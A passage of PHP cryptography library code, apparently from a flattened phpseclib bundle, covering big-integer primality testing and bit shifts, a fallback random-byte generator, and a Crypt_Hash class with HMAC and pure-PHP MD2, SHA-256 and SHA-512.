            if ($this->value[strlen($this->value) - 1] % 2 == 0) {
                $this->value = bcadd($this->value, '1');
            }
        break;
        default:
            $this->value[0]|= 1;
    }
}
function isPrime($t = false) {
    $length = strlen($this->toBytes());
    if (!$t) {
        if ($length >= 163) {
            $t = 2;
        } else if ($length >= 106) {
            $t = 3;
        } else if ($length >= 81) {
            $t = 4;
        } else if ($length >= 68) {
            $t = 5;
        } else if ($length >= 56) {
            $t = 6;
        } else if ($length >= 50) {
            $t = 7;
        } else if ($length >= 43) {
            $t = 8;
        } else if ($length >= 37) {
            $t = 9;
        } else if ($length >= 31) {
            $t = 12;
        } else if ($length >= 25) {
            $t = 15;
        } else if ($length >= 18) {
            $t = 18;
        } else {
            $t = 27;
        }
    }
    switch (MATH_BIGINTEGER_MODE) {
        case MATH_BIGINTEGER_MODE_GMP:
            return gmp_prob_prime($this->value, $t) != 0;
        case MATH_BIGINTEGER_MODE_BCMATH:
            if ($this->value === '2') {
                return true;
            }
            if ($this->value[strlen($this->value) - 1] % 2 == 0) {
                return false;
            }
        break;
        default:
            if ($this->value == array(2)) {
                return true;
            }
            if (~$this->value[0] & 1) {
                return false;
            }
    }
    static $primes, $zero, $one, $two;
    if (!isset($primes)) {
        $primes = array(3, 5, 7, 11, 13, 17, 19, 23, 29, 31, 37, 41, 43, 47, 53, 59, 61, 67, 71, 73, 79, 83, 89, 97, 101, 103, 107, 109, 113, 127, 131, 137, 139, 149, 151, 157, 163, 167, 173, 179, 181, 191, 193, 197, 199, 211, 223, 227, 229, 233, 239, 241, 251, 257, 263, 269, 271, 277, 281, 283, 293, 307, 311, 313, 317, 331, 337, 347, 349, 353, 359, 367, 373, 379, 383, 389, 397, 401, 409, 419, 421, 431, 433, 439, 443, 449, 457, 461, 463, 467, 479, 487, 491, 499, 503, 509, 521, 523, 541, 547, 557, 563, 569, 571, 577, 587, 593, 599, 601, 607, 613, 617, 619, 631, 641, 643, 647, 653, 659, 661, 673, 677, 683, 691, 701, 709, 719, 727, 733, 739, 743, 751, 757, 761, 769, 773, 787, 797, 809, 811, 821, 823, 827, 829, 839, 853, 857, 859, 863, 877, 881, 883, 887, 907, 911, 919, 929, 937, 941, 947, 953, 967, 971, 977, 983, 991, 997);
        if (MATH_BIGINTEGER_MODE != MATH_BIGINTEGER_MODE_INTERNAL) {
            for ($i = 0;$i < count($primes);++$i) {
                $primes[$i] = new Math_BigInteger($primes[$i]);
            }
        }
        $zero = new Math_BigInteger();
        $one = new Math_BigInteger(1);
        $two = new Math_BigInteger(2);
    }
    if ($this->equals($one)) {
        return false;
    }
    if (MATH_BIGINTEGER_MODE != MATH_BIGINTEGER_MODE_INTERNAL) {
        foreach ($primes as $prime) {
            list(, $r) = $this->divide($prime);
            if ($r->equals($zero)) {
                return $this->equals($prime);
            }
        }
    } else {
        $value = $this->value;
        foreach ($primes as $prime) {
            list(, $r) = $this->_divide_digit($value, $prime);
            if (!$r) {
                return count($value) == 1 && $value[0] == $prime;
            }
        }
    }
    $n = $this->copy();
    $n_1 = $n->subtract($one);
    $n_2 = $n->subtract($two);
    $r = $n_1->copy();
    $r_value = $r->value;
    if (MATH_BIGINTEGER_MODE == MATH_BIGINTEGER_MODE_BCMATH) {
        $s = 0;
        while ($r->value[strlen($r->value) - 1] % 2 == 0) {
            $r->value = bcdiv($r->value, '2', 0);
            ++$s;
        }
    } else {
        for ($i = 0, $r_length = count($r_value);$i < $r_length;++$i) {
            $temp = ~ $r_value[$i] & 0xFFFFFF;
            for ($j = 1;($temp >> $j) & 1;++$j) {
            }
            if ($j != 25) {
                break;
            }
        }
        $s = 26 * $i + $j - 1;
        $r->_rshift($s);
    }
    for ($i = 0;$i < $t;++$i) {
        $a = $this->random($two, $n_2);
        $y = $a->modPow($r, $n);
        if (!$y->equals($one) && !$y->equals($n_1)) {
            for ($j = 1;$j < $s && !$y->equals($n_1);++$j) {
                $y = $y->modPow($two, $n);
                if ($y->equals($one)) {
                    return false;
                }
            }
            if (!$y->equals($n_1)) {
                return false;
            }
        }
    }
    return true;
}
function _lshift($shift) {
    if ($shift == 0) {
        return;
    }
    $num_digits = (int)($shift / MATH_BIGINTEGER_BASE);
    $shift%= MATH_BIGINTEGER_BASE;
    $shift = 1 << $shift;
    $carry = 0;
    for ($i = 0;$i < count($this->value);++$i) {
        $temp = $this->value[$i] * $shift + $carry;
        $carry = MATH_BIGINTEGER_BASE === 26 ? intval($temp / 0x4000000) : ($temp >> 31);
        $this->value[$i] = (int)($temp - $carry * MATH_BIGINTEGER_BASE_FULL);
    }
    if ($carry) {
        $this->value[count($this->value) ] = $carry;
    }
    while ($num_digits--) {
        array_unshift($this->value, 0);
    }
}
function _rshift($shift) {
    if ($shift == 0) {
        return;
    }
    $num_digits = (int)($shift / MATH_BIGINTEGER_BASE);
    $shift%= MATH_BIGINTEGER_BASE;
    $carry_shift = MATH_BIGINTEGER_BASE - $shift;
    $carry_mask = (1 << $shift) - 1;
    if ($num_digits) {
        $this->value = array_slice($this->value, $num_digits);
    }
    $carry = 0;
    for ($i = count($this->value) - 1;$i >= 0;--$i) {
        $temp = $this->value[$i] >> $shift | $carry;
        $carry = ($this->value[$i] & $carry_mask) << $carry_shift;
        $this->value[$i] = $temp;
    }
    $this->value = $this->_trim($this->value);
}
function _normalize($result) {
    $result->precision = $this->precision;
    $result->bitmask = $this->bitmask;
    switch (MATH_BIGINTEGER_MODE) {
        case MATH_BIGINTEGER_MODE_GMP:
            if ($this->bitmask !== false) {
                $result->value = gmp_and($result->value, $result->bitmask->value);
            }
            return $result;
        case MATH_BIGINTEGER_MODE_BCMATH:
            if (!empty($result->bitmask->value)) {
                $result->value = bcmod($result->value, $result->bitmask->value);
            }
            return $result;
    }
    $value = & $result->value;
    if (!count($value)) {
        return $result;
    }
    $value = $this->_trim($value);
    if (!empty($result->bitmask->value)) {
        $length = min(count($value), count($this->bitmask->value));
        $value = array_slice($value, 0, $length);
        for ($i = 0;$i < $length;++$i) {
            $value[$i] = $value[$i] & $this->bitmask->value[$i];
        }
    }
    return $result;
}
function _trim($value) {
    for ($i = count($value) - 1;$i >= 0;--$i) {
        if ($value[$i]) {
            break;
        }
        unset($value[$i]);
    }
    return $value;
}
function _array_repeat($input, $multiplier) {
    return ($multiplier) ? array_fill(0, $multiplier, $input) : array();
}
function _base256_lshift(&$x, $shift) {
    if ($shift == 0) {
        return;
    }
    $num_bytes = $shift >> 3;
    $shift&= 7;
    $carry = 0;
    for ($i = strlen($x) - 1;$i >= 0;--$i) {
        $temp = ord($x[$i]) << $shift | $carry;
        $x[$i] = chr($temp);
        $carry = $temp >> 8;
    }
    $carry = ($carry != 0) ? chr($carry) : '';
    $x = $carry . $x . str_repeat(chr(0), $num_bytes);
}
function _base256_rshift(&$x, $shift) {
    if ($shift == 0) {
        $x = ltrim($x, chr(0));
        return '';
    }
    $num_bytes = $shift >> 3;
    $shift&= 7;
    $remainder = '';
    if ($num_bytes) {
        $start = $num_bytes > strlen($x) ? -strlen($x) : -$num_bytes;
        $remainder = substr($x, $start);
        $x = substr($x, 0, -$num_bytes);
    }
    $carry = 0;
    $carry_shift = 8 - $shift;
    for ($i = 0;$i < strlen($x);++$i) {
        $temp = (ord($x[$i]) >> $shift) | $carry;
        $carry = (ord($x[$i]) << $carry_shift) & 0xFF;
        $x[$i] = chr($temp);
    }
    $x = ltrim($x, chr(0));
    $remainder = chr($carry >> $carry_shift) . $remainder;
    return ltrim($remainder, chr(0));
}
function _int2bytes($x) {
    return ltrim(pack('N', $x), chr(0));
}
function _bytes2int($x) {
    $temp = unpack('Nint', str_pad($x, 4, chr(0), STR_PAD_LEFT));
    return $temp['int'];
}
function _encodeASN1Length($length) {
    if ($length <= 0x7F) {
        return chr($length);
    }
    $temp = ltrim(pack('N', $length), chr(0));
    return pack('Ca*', 0x80 | strlen($temp), $temp);
}
function _safe_divide($x, $y) {
    if (MATH_BIGINTEGER_BASE === 26) {
        return (int)($x / $y);
    }
    return ($x - ($x % $y)) / $y;
}
}
if (!function_exists('crypt_random_string')) {
    define('CRYPT_RANDOM_IS_WINDOWS', strtoupper(substr(PHP_OS, 0, 3)) === 'WIN');
    function crypt_random_string($length) {
        if (CRYPT_RANDOM_IS_WINDOWS) {
            if (extension_loaded('mcrypt') && version_compare(PHP_VERSION, '5.3.0', '>=')) {
                return mcrypt_create_iv($length);
            }
            if (extension_loaded('openssl') && version_compare(PHP_VERSION, '5.3.4', '>=')) {
                return openssl_random_pseudo_bytes($length);
            }
        } else {
            if (extension_loaded('openssl') && version_compare(PHP_VERSION, '5.3.0', '>=')) {
                return openssl_random_pseudo_bytes($length);
            }
            static $fp = true;
            if ($fp === true) {
                $fp = @fopen('/dev/urandom', 'rb');
            }
            if ($fp !== true && $fp !== false) {
                return fread($fp, $length);
            }
            if (extension_loaded('mcrypt')) {
                return mcrypt_create_iv($length, MCRYPT_DEV_URANDOM);
            }
        }
        static $crypto = false, $v;
        if ($crypto === false) {
            $old_session_id = session_id();
            $old_use_cookies = ini_get('session.use_cookies');
            $old_session_cache_limiter = session_cache_limiter();
            $_OLD_SESSION = isset($_SESSION) ? $_SESSION : false;
            if ($old_session_id != '') {
                session_write_close();
            }
            session_id(1);
            ini_set('session.use_cookies', 0);
            session_cache_limiter('');
            session_start();
            $v = $seed = $_SESSION['seed'] = pack('H*', sha1((isset($_SERVER) ? phpseclib_safe_serialize($_SERVER) : '') . (isset($_POST) ? phpseclib_safe_serialize($_POST) : '') . (isset($_GET) ? phpseclib_safe_serialize($_GET) : '') . (isset($_COOKIE) ? phpseclib_safe_serialize($_COOKIE) : '') . phpseclib_safe_serialize($GLOBALS) . phpseclib_safe_serialize($_SESSION) . phpseclib_safe_serialize($_OLD_SESSION)));
            if (!isset($_SESSION['count'])) {
                $_SESSION['count'] = 0;
            }
            $_SESSION['count']++;
            session_write_close();
            if ($old_session_id != '') {
                session_id($old_session_id);
                session_start();
                ini_set('session.use_cookies', $old_use_cookies);
                session_cache_limiter($old_session_cache_limiter);
            } else {
                if ($_OLD_SESSION !== false) {
                    $_SESSION = $_OLD_SESSION;
                    unset($_OLD_SESSION);
                } else {
                    unset($_SESSION);
                }
            }
            $key = pack('H*', sha1($seed . 'A'));
            $iv = pack('H*', sha1($seed . 'C'));
            switch (true) {
                case phpseclib_resolve_include_path('Crypt/AES.php'):
                    if (!class_exists('Crypt_AES')) {
                        include_once 'AES.php';
                    }
                    $crypto = new Crypt_AES(CRYPT_AES_MODE_CTR);
                break;
                case phpseclib_resolve_include_path('Crypt/Twofish.php'):
                    if (!class_exists('Crypt_Twofish')) {
                        include_once 'Twofish.php';
                    }
                    $crypto = new Crypt_Twofish(CRYPT_TWOFISH_MODE_CTR);
                break;
                case phpseclib_resolve_include_path('Crypt/Blowfish.php'):
                    if (!class_exists('Crypt_Blowfish')) {
                        include_once 'Blowfish.php';
                    }
                    $crypto = new Crypt_Blowfish(CRYPT_BLOWFISH_MODE_CTR);
                break;
                case phpseclib_resolve_include_path('Crypt/TripleDES.php'):
                    if (!class_exists('Crypt_TripleDES')) {
                        include_once 'TripleDES.php';
                    }
                    $crypto = new Crypt_TripleDES(CRYPT_DES_MODE_CTR);
                break;
                case phpseclib_resolve_include_path('Crypt/DES.php'):
                    if (!class_exists('Crypt_DES')) {
                        include_once 'DES.php';
                    }
                    $crypto = new Crypt_DES(CRYPT_DES_MODE_CTR);
                break;
                case phpseclib_resolve_include_path('Crypt/RC4.php'):
                    if (!class_exists('Crypt_RC4')) {
                        include_once 'RC4.php';
                    }
                    $crypto = new Crypt_RC4();
                break;
                default:
                    user_error('crypt_random_string requires at least one symmetric cipher be loaded');
                    return false;
            }
            $crypto->setKey($key);
            $crypto->setIV($iv);
            $crypto->enableContinuousBuffer();
        }
        $result = '';
        while (strlen($result) < $length) {
            $i = $crypto->encrypt(microtime());
            $r = $crypto->encrypt($i ^ $v);
            $v = $crypto->encrypt($r ^ $i);
            $result.= $r;
        }
        return substr($result, 0, $length);
    }
}
if (!function_exists('phpseclib_safe_serialize')) {
    function phpseclib_safe_serialize(&$arr) {
        if (is_object($arr)) {
            return '';
        }
        if (!is_array($arr)) {
            return serialize($arr);
        }
        if (isset($arr['__phpseclib_marker'])) {
            return '';
        }
        $safearr = array();
        $arr['__phpseclib_marker'] = true;
        foreach (array_keys($arr) as $key) {
            if ($key !== '__phpseclib_marker') {
                $safearr[$key] = phpseclib_safe_serialize($arr[$key]);
            }
        }
        unset($arr['__phpseclib_marker']);
        return serialize($safearr);
    }
}
if (!function_exists('phpseclib_resolve_include_path')) {
    function phpseclib_resolve_include_path($filename) {
        if (function_exists('stream_resolve_include_path')) {
            return stream_resolve_include_path($filename);
        }
        if (file_exists($filename)) {
            return realpath($filename);
        }
        $paths = PATH_SEPARATOR == ':' ? preg_split('#(?<!phar):#', get_include_path()) : explode(PATH_SEPARATOR, get_include_path());
        foreach ($paths as $prefix) {
            $ds = substr($prefix, -1) == DIRECTORY_SEPARATOR ? '' : DIRECTORY_SEPARATOR;
            $file = $prefix . $ds . $filename;
            if (file_exists($file)) {
                return realpath($file);
            }
        }
        return false;
    }
}
define('CRYPT_HASH_MODE_INTERNAL', 1);
define('CRYPT_HASH_MODE_MHASH', 2);
define('CRYPT_HASH_MODE_HASH', 3);
class Crypt_Hash {
    var $hashParam;
    var $b;
    var $l = false;
    var $hash;
    var $key = false;
    var $opad;
    var $ipad;
    function __construct($hash = 'sha1') {
        if (!defined('CRYPT_HASH_MODE')) {
            switch (true) {
                case extension_loaded('hash'):
                    define('CRYPT_HASH_MODE', CRYPT_HASH_MODE_HASH);
                break;
                case extension_loaded('mhash'):
                    define('CRYPT_HASH_MODE', CRYPT_HASH_MODE_MHASH);
                break;
                default:
                    define('CRYPT_HASH_MODE', CRYPT_HASH_MODE_INTERNAL);
            }
        }
        $this->setHash($hash);
    }
    function Crypt_Hash($hash = 'sha1') {
        $this->__construct($hash);
    }
    function setKey($key = false) {
        $this->key = $key;
    }
    function getHash() {
        return $this->hashParam;
    }
    function setHash($hash) {
        $this->hashParam = $hash = strtolower($hash);
        switch ($hash) {
            case 'md5-96':
            case 'sha1-96':
            case 'sha256-96':
            case 'sha512-96':
                $hash = substr($hash, 0, -3);
                $this->l = 12;
            break;
            case 'md2':
            case 'md5':
                $this->l = 16;
            break;
            case 'sha1':
                $this->l = 20;
            break;
            case 'sha256':
                $this->l = 32;
            break;
            case 'sha384':
                $this->l = 48;
            break;
            case 'sha512':
                $this->l = 64;
        }
        switch ($hash) {
            case 'md2':
                $mode = CRYPT_HASH_MODE == CRYPT_HASH_MODE_HASH && in_array('md2', hash_algos()) ? CRYPT_HASH_MODE_HASH : CRYPT_HASH_MODE_INTERNAL;
            break;
            case 'sha384':
            case 'sha512':
                $mode = CRYPT_HASH_MODE == CRYPT_HASH_MODE_MHASH ? CRYPT_HASH_MODE_INTERNAL : CRYPT_HASH_MODE;
            break;
            default:
                $mode = CRYPT_HASH_MODE;
        }
        switch ($mode) {
            case CRYPT_HASH_MODE_MHASH:
                switch ($hash) {
                    case 'md5':
                        $this->hash = MHASH_MD5;
                    break;
                    case 'sha256':
                        $this->hash = MHASH_SHA256;
                    break;
                    case 'sha1':
                    default:
                        $this->hash = MHASH_SHA1;
                }
                return;
            case CRYPT_HASH_MODE_HASH:
                switch ($hash) {
                    case 'md5':
                        $this->hash = 'md5';
                        return;
                    case 'md2':
                    case 'sha256':
                    case 'sha384':
                    case 'sha512':
                        $this->hash = $hash;
                        return;
                    case 'sha1':
                    default:
                        $this->hash = 'sha1';
                }
                return;
        }
        switch ($hash) {
            case 'md2':
                $this->b = 16;
                $this->hash = array($this, '_md2');
            break;
            case 'md5':
                $this->b = 64;
                $this->hash = array($this, '_md5');
            break;
            case 'sha256':
                $this->b = 64;
                $this->hash = array($this, '_sha256');
            break;
            case 'sha384':
            case 'sha512':
                $this->b = 128;
                $this->hash = array($this, '_sha512');
            break;
            case 'sha1':
            default:
                $this->b = 64;
                $this->hash = array($this, '_sha1');
        }
        $this->ipad = str_repeat(chr(0x36), $this->b);
        $this->opad = str_repeat(chr(0x5C), $this->b);
    }
    function hash($text) {
        $mode = is_array($this->hash) ? CRYPT_HASH_MODE_INTERNAL : CRYPT_HASH_MODE;
        if (!empty($this->key) || is_string($this->key)) {
            switch ($mode) {
                case CRYPT_HASH_MODE_MHASH:
                    $output = mhash($this->hash, $text, $this->key);
                break;
                case CRYPT_HASH_MODE_HASH:
                    $output = hash_hmac($this->hash, $text, $this->key, true);
                break;
                case CRYPT_HASH_MODE_INTERNAL:
                    $key = strlen($this->key) > $this->b ? call_user_func($this->hash, $this->key) : $this->key;
                    $key = str_pad($key, $this->b, chr(0));
                    $temp = $this->ipad ^ $key;
                    $temp.= $text;
                    $temp = call_user_func($this->hash, $temp);
                    $output = $this->opad ^ $key;
                    $output.= $temp;
                    $output = call_user_func($this->hash, $output);
            }
        } else {
            switch ($mode) {
                case CRYPT_HASH_MODE_MHASH:
                    $output = mhash($this->hash, $text);
                break;
                case CRYPT_HASH_MODE_HASH:
                    $output = hash($this->hash, $text, true);
                break;
                case CRYPT_HASH_MODE_INTERNAL:
                    $output = call_user_func($this->hash, $text);
            }
        }
        return substr($output, 0, $this->l);
    }
    function getLength() {
        return $this->l;
    }
    function _md5($m) {
        return pack('H*', md5($m));
    }
    function _sha1($m) {
        return pack('H*', sha1($m));
    }
    function _md2($m) {
        static $s = array(41, 46, 67, 201, 162, 216, 124, 1, 61, 54, 84, 161, 236, 240, 6, 19, 98, 167, 5, 243, 192, 199, 115, 140, 152, 147, 43, 217, 188, 76, 130, 202, 30, 155, 87, 60, 253, 212, 224, 22, 103, 66, 111, 24, 138, 23, 229, 18, 190, 78, 196, 214, 218, 158, 222, 73, 160, 251, 245, 142, 187, 47, 238, 122, 169, 104, 121, 145, 21, 178, 7, 63, 148, 194, 16, 137, 11, 34, 95, 33, 128, 127, 93, 154, 90, 144, 50, 39, 53, 62, 204, 231, 191, 247, 151, 3, 255, 25, 48, 179, 72, 165, 181, 209, 215, 94, 146, 42, 172, 86, 170, 198, 79, 184, 56, 210, 150, 164, 125, 182, 118, 252, 107, 226, 156, 116, 4, 241, 69, 157, 112, 89, 100, 113, 135, 32, 134, 91, 207, 101, 230, 45, 168, 2, 27, 96, 37, 173, 174, 176, 185, 246, 28, 70, 97, 105, 52, 64, 126, 15, 85, 71, 163, 35, 221, 81, 175, 58, 195, 92, 249, 206, 186, 197, 234, 38, 44, 83, 13, 110, 133, 40, 132, 9, 211, 223, 205, 244, 65, 129, 77, 82, 106, 220, 55, 200, 108, 193, 171, 250, 36, 225, 123, 8, 12, 189, 177, 74, 120, 136, 149, 139, 227, 99, 232, 109, 233, 203, 213, 254, 59, 0, 29, 57, 242, 239, 183, 14, 102, 88, 208, 228, 166, 119, 114, 248, 235, 117, 75, 10, 49, 68, 80, 180, 143, 237, 31, 26, 219, 153, 141, 51, 159, 17, 131, 20);
        $pad = 16 - (strlen($m) & 0xF);
        $m.= str_repeat(chr($pad), $pad);
        $length = strlen($m);
        $c = str_repeat(chr(0), 16);
        $l = chr(0);
        for ($i = 0;$i < $length;$i+= 16) {
            for ($j = 0;$j < 16;$j++) {
                $c[$j] = chr($s[ord($m[$i + $j] ^ $l) ] ^ ord($c[$j]));
                $l = $c[$j];
            }
        }
        $m.= $c;
        $length+= 16;
        $x = str_repeat(chr(0), 48);
        for ($i = 0;$i < $length;$i+= 16) {
            for ($j = 0;$j < 16;$j++) {
                $x[$j + 16] = $m[$i + $j];
                $x[$j + 32] = $x[$j + 16] ^ $x[$j];
            }
            $t = chr(0);
            for ($j = 0;$j < 18;$j++) {
                for ($k = 0;$k < 48;$k++) {
                    $x[$k] = $t = $x[$k] ^ chr($s[ord($t) ]);
                }
                $t = chr(ord($t) + $j);
            }
        }
        return substr($x, 0, 16);
    }
    function _sha256($m) {
        if (extension_loaded('suhosin')) {
            return pack('H*', sha256($m));
        }
        $hash = array(0x6a09e667, 0xbb67ae85, 0x3c6ef372, 0xa54ff53a, 0x510e527f, 0x9b05688c, 0x1f83d9ab, 0x5be0cd19);
        static $k = array(0x428a2f98, 0x71374491, 0xb5c0fbcf, 0xe9b5dba5, 0x3956c25b, 0x59f111f1, 0x923f82a4, 0xab1c5ed5, 0xd807aa98, 0x12835b01, 0x243185be, 0x550c7dc3, 0x72be5d74, 0x80deb1fe, 0x9bdc06a7, 0xc19bf174, 0xe49b69c1, 0xefbe4786, 0x0fc19dc6, 0x240ca1cc, 0x2de92c6f, 0x4a7484aa, 0x5cb0a9dc, 0x76f988da, 0x983e5152, 0xa831c66d, 0xb00327c8, 0xbf597fc7, 0xc6e00bf3, 0xd5a79147, 0x06ca6351, 0x14292967, 0x27b70a85, 0x2e1b2138, 0x4d2c6dfc, 0x53380d13, 0x650a7354, 0x766a0abb, 0x81c2c92e, 0x92722c85, 0xa2bfe8a1, 0xa81a664b, 0xc24b8b70, 0xc76c51a3, 0xd192e819, 0xd6990624, 0xf40e3585, 0x106aa070, 0x19a4c116, 0x1e376c08, 0x2748774c, 0x34b0bcb5, 0x391c0cb3, 0x4ed8aa4a, 0x5b9cca4f, 0x682e6ff3, 0x748f82ee, 0x78a5636f, 0x84c87814, 0x8cc70208, 0x90befffa, 0xa4506ceb, 0xbef9a3f7, 0xc67178f2);
        $length = strlen($m);
        $m.= str_repeat(chr(0), 64 - (($length + 8) & 0x3F));
        $m[$length] = chr(0x80);
        $m.= pack('N2', 0, $length << 3);
        $chunks = str_split($m, 64);
        foreach ($chunks as $chunk) {
            $w = array();
            for ($i = 0;$i < 16;$i++) {
                extract(unpack('Ntemp', $this->_string_shift($chunk, 4)));
                $w[] = $temp;
            }
            for ($i = 16;$i < 64;$i++) {
                $s0 = $this->_rightRotate($w[$i - 15], 7) ^ $this->_rightRotate($w[$i - 15], 18) ^ $this->_rightShift($w[$i - 15], 3);
                $s1 = $this->_rightRotate($w[$i - 2], 17) ^ $this->_rightRotate($w[$i - 2], 19) ^ $this->_rightShift($w[$i - 2], 10);
                $w[$i] = $this->_add($w[$i - 16], $s0, $w[$i - 7], $s1);
            }
            list($a, $b, $c, $d, $e, $f, $g, $h) = $hash;
            for ($i = 0;$i < 64;$i++) {
                $s0 = $this->_rightRotate($a, 2) ^ $this->_rightRotate($a, 13) ^ $this->_rightRotate($a, 22);
                $maj = ($a & $b) ^ ($a & $c) ^ ($b & $c);
                $t2 = $this->_add($s0, $maj);
                $s1 = $this->_rightRotate($e, 6) ^ $this->_rightRotate($e, 11) ^ $this->_rightRotate($e, 25);
                $ch = ($e & $f) ^ ($this->_not($e) & $g);
                $t1 = $this->_add($h, $s1, $ch, $k[$i], $w[$i]);
                $h = $g;
                $g = $f;
                $f = $e;
                $e = $this->_add($d, $t1);
                $d = $c;
                $c = $b;
                $b = $a;
                $a = $this->_add($t1, $t2);
            }
            $hash = array($this->_add($hash[0], $a), $this->_add($hash[1], $b), $this->_add($hash[2], $c), $this->_add($hash[3], $d), $this->_add($hash[4], $e), $this->_add($hash[5], $f), $this->_add($hash[6], $g), $this->_add($hash[7], $h));
        }
        return pack('N8', $hash[0], $hash[1], $hash[2], $hash[3], $hash[4], $hash[5], $hash[6], $hash[7]);
    }
    function _sha512($m) {
        if (!class_exists('Math_BigInteger')) {
            include_once 'Math/BigInteger.php';
        }
        static $init384, $init512, $k;
        if (!isset($k)) {
            $init384 = array('cbbb9d5dc1059ed8', '629a292a367cd507', '9159015a3070dd17', '152fecd8f70e5939', '67332667ffc00b31', '8eb44a8768581511', 'db0c2e0d64f98fa7', '47b5481dbefa4fa4');
            $init512 = array('6a09e667f3bcc908', 'bb67ae8584caa73b', '3c6ef372fe94f82b', 'a54ff53a5f1d36f1', '510e527fade682d1', '9b05688c2b3e6c1f', '1f83d9abfb41bd6b', '5be0cd19137e2179');
            for ($i = 0;$i < 8;$i++) {
                $init384[$i] = new Math_BigInteger($init384[$i], 16);
                $init384[$i]->setPrecision(64);
                $init512[$i] = new Math_BigInteger($init512[$i], 16);
                $init512[$i]->setPrecision(64);
            }
            $k = array('428a2f98d728ae22', '7137449123ef65cd', 'b5c0fbcfec4d3b2f', 'e9b5dba58189dbbc', '3956c25bf348b538', '59f111f1b605d019', '923f82a4af194f9b', 'ab1c5ed5da6d8118', 'd807aa98a3030242', '12835b0145706fbe', '243185be4ee4b28c', '550c7dc3d5ffb4e2', '72be5d74f27b896f', '80deb1fe3b1696b1', '9bdc06a725c71235', 'c19bf174cf692694', 'e49b69c19ef14ad2', 'efbe4786384f25e3', '0fc19dc68b8cd5b5', '240ca1cc77ac9c65', '2de92c6f592b0275', '4a7484aa6ea6e483', '5cb0a9dcbd41fbd4', '76f988da831153b5', '983e5152ee66dfab', 'a831c66d2db43210', 'b00327c898fb213f', 'bf597fc7beef0ee4', 'c6e00bf33da88fc2', 'd5a79147930aa725', '06ca6351e003826f', '142929670a0e6e70', '27b70a8546d22ffc', '2e1b21385c26c926', '4d2c6dfc5ac42aed', '53380d139d95b3df', '650a73548baf63de', '766a0abb3c77b2a8', '81c2c92e47edaee6', '92722c851482353b', 'a2bfe8a14cf10364', 'a81a664bbc423001', 'c24b8b70d0f89791', 'c76c51a30654be30', 'd192e819d6ef5218', 'd69906245565a910', 'f40e35855771202a', '106aa07032bbd1b8', '19a4c116b8d2d0c8', '1e376c085141ab53', '2748774cdf8eeb99', '34b0bcb5e19b48a8', '391c0cb3c5c95a63', '4ed8aa4ae3418acb', '5b9cca4f7763e373', '682e6ff3d6b2b8a3', '748f82ee5defb2fc', '78a5636f43172f60', '84c87814a1f0ab72', '8cc702081a6439ec', '90befffa23631e28', 'a4506cebde82bde9', 'bef9a3f7b2c67915', 'c67178f2e372532b', 'ca273eceea26619c', 'd186b8c721c0c207', 'eada7dd6cde0eb1e', 'f57d4f7fee6ed178', '06f067aa72176fba', '0a637dc5a2c898a6', '113f9804bef90dae', '1b710b35131c471b', '28db77f523047d84', '32caab7b40c72493', '3c9ebe0a15c9bebc', '431d67c49c100d4c', '4cc5d4becb3e42b6', '597f299cfc657e2a', '5fcb6fab3ad6faec', '6c44198c4a475817');
            for ($i = 0;$i < 80;$i++) {
                $k[$i] = new Math_BigInteger($k[$i], 16);
            }
        }
        $hash = $this->l == 48 ? $init384 : $init512;
        $length = strlen($m);
        $m.= str_repeat(chr(0), 128 - (($length + 16) & 0x7F));
        $m[$length] = chr(0x80);
        $m.= pack('N4', 0, 0, 0, $length << 3);
        $chunks = str_split($m, 128);
        foreach ($chunks as $chunk) {
            $w = array();
            for ($i = 0;$i < 16;$i++) {
                $temp = new Math_BigInteger($this->_string_shift($chunk, 8), 256);
                $temp->setPrecision(64);
                $w[] = $temp;
            }
            for ($i = 16;$i < 80;$i++) {
                $temp = array($w[$i - 15]->bitwise_rightRotate(1), $w[$i - 15]->bitwise_rightRotate(8), $w[$i - 15]->bitwise_rightShift(7));
                $s0 = $temp[0]->bitwise_xor($temp[1]);
                $s0 = $s0->bitwise_xor($temp[2]);
                $temp = array($w[$i - 2]->bitwise_rightRotate(19), $w[$i - 2]->bitwise_rightRotate(61), $w[$i - 2]->bitwise_rightShift(6));
                $s1 = $temp[0]->bitwise_xor($temp[1]);
                $s1 = $s1->bitwise_xor($temp[2]);
                $w[$i] = $w[$i - 16]->copy();
                $w[$i] = $w[$i]->add($s0);
                $w[$i] = $w[$i]->add($w[$i - 7]);
                $w[$i] = $w[$i]->add($s1);
            }
            $a = $hash[0]->copy();
            $b = $hash[1]->copy();
            $c = $hash[2]->copy();
            $d = $hash[3]->copy();
            $e = $hash[4]->copy();
            $f = $hash[5]->copy();
            $g = $hash[6]->copy();
            $h = $hash[7]->copy();
            for ($i = 0;$i < 80;$i++) {
                $temp = array($a->bitwise_rightRotate(28), $a->bitwise_rightRotate(34), $a->bitwise_rightRotate(39));
                $s0 = $temp[0]->bitwise_xor($temp[1]);
                $s0 = $s0->bitwise_xor($temp[2]);
                $temp = array($a->bitwise_and($b), $a->bitwise_and($c), $b->bitwise_and($c));
                $maj = $temp[0]->bitwise_xor($temp[1]);
                $maj = $maj->bitwise_xor($temp[2]);
                $t2 = $s0->add($maj);
                $temp = array($e->bitwise_rightRotate(14), $e->bitwise_rightRotate(18), $e->bitwise_rightRotate(41));
                $s1 = $temp[0]->bitwise_xor($temp[1]);
                $s1 = $s1->bitwise_xor($temp[2]);
                $temp = array($e->bitwise_and($f), $g->bitwise_and($e->bitwise_not()));
                $ch = $temp[0]->bitwise_xor($temp[1]);
                $t1 = $h->add($s1);
                $t1 = $t1->add($ch);
                $t1 = $t1->add($k[$i]);
                $t1 = $t1->add($w[$i]);
                $h = $g->copy();
                $g = $f->copy();
                $f = $e->copy();
                $e = $d->add($t1);
                $d = $c->copy();
                $c = $b->copy();
                $b = $a->copy();
                $a = $t1->add($t2);
            }
            $hash = array($hash[0]->add($a), $hash[1]->add($b), $hash[2]->add($c), $hash[3]->add($d), $hash[4]->add($e), $hash[5]->add($f), $hash[6]->add($g), $hash[7]->add($h));
        }
        $temp = $hash[0]->toBytes() . $hash[1]->toBytes() . $hash[2]->toBytes() . $hash[3]->toBytes() . $hash[4]->toBytes() . $hash[5]->toBytes();
        if ($this->l != 48) {
            $temp.= $hash[6]->toBytes() . $hash[7]->toBytes();
        }
        return $temp;
    }
    function _rightRotate($int, $amt) {
        $invamt = 32 - $amt;
        $mask = (1 << $invamt) - 1;
        return (($int << $invamt) & 0xFFFFFFFF) | (($int >> $amt) & $mask);
    }
    function _rightShift($int, $amt) {
        $mask = (1 << (32 - $amt)) - 1;
        return ($int >> $amt) & $mask;
    }
    function _not($int) {
        return ~$int & 0xFFFFFFFF;
    }
    function _add() {
        static $mod;
        if (!isset($mod)) {
